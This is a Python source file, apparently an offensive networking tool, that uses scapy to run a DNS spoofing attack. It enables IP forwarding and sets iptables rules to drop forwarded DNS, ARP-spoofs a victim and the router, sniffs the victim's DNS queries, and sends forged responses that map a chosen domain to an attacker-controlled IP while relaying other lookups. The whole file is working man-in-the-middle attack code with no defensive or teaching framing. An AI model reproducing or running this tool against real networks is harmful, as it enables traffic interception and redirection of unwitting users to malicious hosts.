from scapy.all import *
from arp import * 
from helper import *
import traceback
import subprocess
import os

class dns:
    @staticmethod    
    def set_ip_forwarding(ip_forwarding, interface):
        """
        Sets the ip forwarding setting, enable or disable it
        Also adds or deletes the correct firewall forwarding rules
        """
        if ip_forwarding:
            print("Enabling IP forwarding")
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            dns.run_iptables_command("sudo iptables -I FORWARD 1 -p udp --dport 53 -j DROP")
            dns.run_iptables_command("sudo iptables -I FORWARD 2 -i %s -o %s -j ACCEPT" % (interface, interface))
            dns.run_iptables_command("sudo iptables -I FORWARD 3 -o %s -i %s -j ACCEPT" % (interface, interface))
            
        else:
            print("Disabling IP forwarding")
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            try:
                dns.run_iptables_command("sudo iptables -D FORWARD -i %s -o %s -j ACCEPT" % (interface, interface))
                dns.run_iptables_command("sudo iptables -D FORWARD -o %s -i %s -j ACCEPT" % (interface, interface))
                dns.run_iptables_command("sudo iptables -D FORWARD -p udp --dport 53 -j DROP")
            except Exception as e:
                print("WARNING: could not remove iptables rules, manual cleanup required")
                raise

    @staticmethod
    def run_iptables_command(command):
        """
        Function to execute iptables commands, with error handling
        """
        try:
            result = subprocess.check_call(command, shell=True)
        except subprocess.CalledProcessError as e:
            print("error executing command: '%s', manually add or remove rule" % command)
            raise
        except Exception as e:
            raise

    @staticmethod
    def send_spoof_packet(packet, domain, spoofed_ip):
        """
        Send a dns spoofing packet
        """
        spoofed_packet = (
            IP(dst=packet[IP].src, src=packet[IP].dst) /
            UDP(dport=packet[UDP].sport, sport=53) /
            DNS(
                id=packet[DNS].id,
                qr=1,
                aa=1,
                rd=1,
                ra=1,
                qd=packet[DNS].qd,
                an=DNSRR(rrname=domain, type='A', rdata=spoofed_ip, ttl=300)
            )
        )
        send(spoofed_packet, verbose=False)
        print("Send spoofed DNS response for %s to %s with IP %s" % (domain, packet[IP].src, spoofed_ip))
        
    @staticmethod
    def request_domain(domain, packet):
        """
        Get the IP address of a domain
        """
        forward_request = IP(dst="8.8.8.8") / UDP(dport=53) / packet[DNS]
        
        res = sr1(forward_request, timeout=2, verbose=False)
        if res and res.haslayer(DNS) and res[DNS].qr == 1:
            victim_response = (
                IP(dst=packet[IP].src, src=packet[IP].dst) /
                UDP(dport=packet[UDP].sport, sport=53) /
                res[DNS]
            )
            print("Received response for %s, forwarding to victim" % domain)
            send(victim_response, verbose=False)


    @staticmethod
    def handle_packet(packet, domain, spoofed_ip, victim_ip, router_ip):
        """
        Handle a sniffed packet
        """
        
        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0 and packet[IP].src == victim_ip:
            # packet is a DNS request packet
            query_domain = packet.getlayer(DNS).qd.qname.decode('utf-8').rstrip('.')
            print("DNS query received from %s for %s (%s)" % (packet[IP].src, query_domain, "To be spoofed" if domain == query_domain else "Not spoofed"))

            if query_domain == domain:
                # request if for domain to be spoofed
                print("Spoofing %s to %s" % (domain, spoofed_ip))
                dns.send_spoof_packet(packet, domain, spoofed_ip)
                
            else:
                # Request is for domain that should not be spoofed so get legitimate IP
                dns.request_domain(query_domain, packet)
                
        elif packet.haslayer(DNS) and packet.getlayer(DNS).qr == 1:
            # Packet is a DNS response packet
            pass
              
    @staticmethod      
    def spoof(interface, domain, victim_ip, spoofed_ip):
        print("Starting a DNS spoof for victim %s, pretending %s is at %s" % (victim_ip, domain, spoofed_ip))
        try:
            dns.set_ip_forwarding(True, interface)
            conf.route.resync()
            router_ip = conf.route.route("0.0.0.0")[2]
            print("Router ip: %s" % router_ip)
            arp1 = arp()
            arp1.two_way_arp_spoof(victim_ip, router_ip, 2, interface)
            sniff(filter="udp and port 53", prn=lambda pkt: dns.handle_packet(pkt, domain, spoofed_ip, victim_ip, router_ip), store=0, iface=interface)
        except KeyboardInterrupt:
            print("stopping DNS spoof")
            arp1.stop_two_way_spoof()
        except Exception as e:
            print("An error occurred: %s" % e)
            traceback.print_exc()
            
        finally:
            dns.set_ip_forwarding(False, interface)
            print("DNS spoofing stopped")
            
            
            
        
